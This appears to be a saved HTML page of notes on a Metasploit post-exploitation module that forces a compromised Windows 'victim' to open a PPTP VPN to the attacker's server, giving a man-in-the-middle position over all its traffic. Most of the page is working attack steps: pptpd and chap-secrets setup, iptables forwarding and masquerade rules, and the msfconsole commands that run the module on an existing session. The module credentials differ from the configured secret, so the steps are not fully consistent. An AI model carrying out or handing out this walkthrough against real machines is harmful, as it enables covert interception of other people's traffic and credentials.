<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>PPTP Tunnel</title>
</head><body>http://www.shelliscoming.com/2013/06/metasploit-man-in-middle-through-pptp.html<br/>
How-To video: https://www.youtube.com/watch?v=vdppEZjMPCM<br/>
<br/>
Metasploit<br/>
post/windows/manage/pptp_tunnel<br/>
<br/>
<br/>
The idea is to create an outbound VPN connection (pptp) from the "victim" machine to a VPN server configured in the "attacker" machine. Once the &nbsp;pptp tunnel is created we can forward all victim traffic through the tunnel getting a man-in-the-middle attack. <br/>
<br/>
<span style="font-family: sans"><span style="font-size: 10pt"><br/>
<div style="text-align: justify">Obviously we need to configure forwarding and masquerading to get a real MITM, which can be easily done with IPTABLES. To make the tests I have used the pptpd package as VPN server from Debian. &nbsp;The simplest configuration is:<br/>
<b><br/>
</b><b>ATTACKER MACHINE</b><br/>
<br/>
root@Mordor:~# tail -2 /etc/pptpd.conf<br/>
localip 192.168.0.1<br/>
remoteip 192.168.0.234-238<br/>
<br/>
root@Mordor:~# tail -1 /etc/ppp/chap-secrets<br/>
msf * m3taSpl01t *<br/>
<br/>
root@Mordor:~# /etc/init.d/pptpd restart &amp;&amp; netstat -putan | grep 1723<br/>
Restarting PPTP: <br/>
Stopping PPTP: pptpd.<br/>
Starting PPTP Daemon: pptpd.<br/>
tcp &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; &nbsp;0 0.0.0.0:1723 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; &nbsp;22027/pptpd <br/>
<br/>
root@Mordor:~# iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE<br/>
root@Mordor:~# iptables -A FORWARD -i ppp0 -o wlan0 -j ACCEPT<br/>
root@Mordor:~# iptables -A FORWARD -i wlan0 -o ppp0 -m state --state ESTABLISHED,RELATED -j ACCEPT<br/>
root@Mordor:~# echo 1 &gt; /proc/sys/net/ipv4/ip_forward<br/>
<br/>
root@Mordor:~# ifconfig wlan0 | grep 82<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inet addr:192.168.1.82 &nbsp;Bcast:192.168.1.255 &nbsp;Mask:255.255.255.0<br/>
<br/>
root@Mordor:~# route -n<br/>
Kernel IP routing table<br/>
Destination &nbsp; &nbsp; Gateway &nbsp; &nbsp; &nbsp; &nbsp; Genmask &nbsp; &nbsp; &nbsp; &nbsp; Flags Metric Ref &nbsp; &nbsp;Use Iface<br/>
192.168.1.0 &nbsp; &nbsp; 0.0.0.0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;255.255.255.0 &nbsp; U &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp; 0 wlan0<br/>
0.0.0.0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.168.1.1 &nbsp; &nbsp; 0.0.0.0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; UG &nbsp; 0 &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; &nbsp;0 wlan0<br/>
<br/>
<br/>
<br/>
<b>VICTIM MACHINE</b><br/>
<br/>
C:\Documents and Settings\Peregrino&gt;ipconfig<br/>
<br/>
Configuración IP de Windows<br/>
<br/>
Adaptador Ethernet Conexiones de red inalámbricas &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;:<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Sufijo de conexión específica DNS :<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Dirección IP. . . . . . . . . . . : &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.131<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Máscara de subred . . . . . . . . : &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;255.255.255.0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Puerta de enlace predeterminada &nbsp; : &nbsp; &nbsp; &nbsp;192.168.1.1<br/>
<br/>
C:\Documents and Settings\Peregrino&gt;route PRINT<br/>
===========================================================================<br/>
<br/>
Rutas activas:<br/>
Destino de red &nbsp; &nbsp; &nbsp; &nbsp;Máscara de red &nbsp; Puerta de acceso &nbsp; &nbsp; &nbsp; Interfaz &nbsp; &nbsp; &nbsp; Métrica<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0.0.0.0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0.0.0.0 &nbsp; &nbsp; &nbsp; 192.168.1.1 &nbsp; &nbsp; &nbsp; 192.168.1.131 &nbsp; &nbsp; &nbsp; &nbsp; 25<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 127.0.0.0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 255.0.0.0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 127.0.0.1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;127.0.0.1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.0 &nbsp; &nbsp; &nbsp; 255.255.255.0 &nbsp; 192.168.1.131 &nbsp; &nbsp; &nbsp; 192.168.1.131 &nbsp; &nbsp; &nbsp; &nbsp; 25<br/>
&nbsp; &nbsp; 192.168.1.131 &nbsp;255.255.255.255 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;127.0.0.1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;127.0.0.1 &nbsp; &nbsp; &nbsp; &nbsp; 25<br/>
&nbsp; &nbsp; 192.168.1.255 &nbsp;255.255.255.255 &nbsp; 192.168.1.131 &nbsp; &nbsp; &nbsp; 192.168.1.131 &nbsp; &nbsp; &nbsp; &nbsp; 25<br/>
<br/>
<br/>
PPTP uses a TCP port as control channel and GRE to send encapsulated data so port 53 and 1723 must be reachable. Take this into account if you use it over WAN.<br/>
<br/>
With this configuration you only need to run the module with the previous parameters (username and password):<br/>
<br/>
msf post(pptp_tunnel) &gt; set PASSWORD M3taSpl01t<br/>
PASSWORD =&gt; M3taSpl01t<br/>
msf post(pptp_tunnel) &gt; set USERNAME bmerino<br/>
USERNAME =&gt; bmerino<br/>
msf post(pptp_tunnel) &gt; set RHOST 192.168.1.82<br/>
RHOST =&gt; 192.168.1.82<br/>
msf post(pptp_tunnel) &gt; set session 1<br/>
session =&gt; 1<br/>
msf post(pptp_tunnel) &gt; run<br/>
</div></span></span></body></html>